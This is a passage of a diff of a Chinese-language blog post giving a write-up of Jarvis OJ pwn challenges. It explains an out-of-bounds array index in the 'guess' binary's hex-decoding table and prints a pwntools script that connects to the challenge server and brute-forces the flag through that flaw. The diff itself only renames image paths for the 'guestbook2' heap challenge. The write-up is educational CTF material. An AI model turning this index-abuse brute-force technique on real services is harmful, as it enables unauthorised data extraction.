 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">value1 = bin_by_hex[flag_hex[2 * i]]; </span><br><span class="line">value2 = bin_by_hex[flag_hex[2 * i + 1]]; </span><br><span class="line">given_flag[i] = value2 | 16 * value1;</span><br></pre></td></tr></table></figure>
 <p>这里程序使用了 bin_by_hex 这样的形式进行了一次内存寻址</p>
 <p>目的是为了将 16 进制字符串转换为 真正的字符串<br>可是这里为什么不直接使用现成的转换算法 , 而是使用 bin_by_hex 进行一次内存寻址呢 ?<br>而漏洞就存在于这里；<br>我们知道 , 在 C 语言中 , 数组名称就相当于是数组的首地址<br><strong>要访问数组的某一个元素 , 可以使用 数组名[索引] 这样的形式来访问</strong><br>这种访问形式实际上进行的操作是这样的 , 例如 :</p>
@@ -527,13 +527,13 @@
 <p>exp：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> 1 from pwn import *</span><br><span class="line"> 2 import string</span><br><span class="line"> 3 </span><br><span class="line"> 4 p=remote(&apos;pwn.jarvisoj.com&apos;,9878)                                               </span><br><span class="line"> 5 e=ELF(&apos;./guess&apos;)</span><br><span class="line"> 6 p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line"> 7 </span><br><span class="line"> 8 payload=&quot;&quot;</span><br><span class="line"> 9 l=string.digits+&apos;_&#123;&#125;&apos;+string.ascii_lowercase+string.ascii_uppercase</span><br><span class="line">   //string.digits：数字0~9;string.lowercase：所有小写字母;string.uppercase：所有大写字母</span><br><span class="line">10 for i in range(50):</span><br><span class="line">11    payload+=&apos;0&apos;</span><br><span class="line">12    payload+=chr(128+i+0x40)  //bin_by_hex 起始+i+与flag差值0x40</span><br><span class="line">13 #print payload</span><br><span class="line">14 t=list(payload)  //将构造好的payload中字符列出</span><br><span class="line">15 flag=&apos;&apos;</span><br><span class="line">16 for i in range(50): //匹配验证</span><br><span class="line">17     for j in l:</span><br><span class="line">18         t[i*2]=j.encode(&apos;hex&apos;)[0]</span><br><span class="line">19         t[2*i+1]=j.encode(&apos;hex&apos;)[1]</span><br><span class="line">20         p.sendline(&apos;&apos;.join(t))</span><br><span class="line">21         re=p.recvline()</span><br><span class="line">22         if re.count(&apos;Yaaa&apos;):</span><br><span class="line">23             flag+=j</span><br><span class="line">24             break</span><br><span class="line">25     print flag</span><br><span class="line">26 p.interactive()</span><br></pre></td></tr></table></figure>
 <p>7.guestbooks2</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gue1.png" alt="1543568988138"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gue1.png" alt="1543568988138"></p>
 <p>是堆的题目，64位文件，保护基本都开；</p>
 <p>拖ida分析：</p>
 <p>chunk初始化：</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gue2.png" alt="1543584408571"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gue2.png" alt="1543584408571"></p>
 <p>新增chunk后：</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gue3.png" alt="1543584447569"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gue3.png" alt="1543584447569"></p>
 
       
     </div>
